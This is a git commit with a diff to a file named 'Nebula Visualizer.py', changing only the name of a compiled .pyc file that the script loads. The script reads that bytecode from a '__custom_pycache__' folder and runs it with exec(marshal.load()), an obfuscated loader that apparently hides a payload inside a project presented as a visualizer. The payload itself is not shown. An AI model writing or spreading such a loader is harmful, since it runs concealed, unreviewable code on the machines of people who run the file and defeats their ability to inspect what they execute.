3ea58c51414d4feb32f5a570b8c52fc875d95502
SiglabsOP <spectralpulse.456789012@gmail.com>
2024-12-19 10:40:46 +0100

    pathway patch

--- Nebula Visualizer.py
+++ Nebula Visualizer.py
@@ -2,6 +2,6 @@
 import marshal
 import os
 
-s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Nebula Visualizer_d586be3138a043fb8f7233abfa188fa6.cpython-xxx.pyc'), 'rb')
+s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'Nebula Visualizer_78ba84b1f74146f5a8b9bb0efe8b9fe3.cpython-xxx.pyc'), 'rb')
 s.seek(16)
 exec(marshal.load(s))
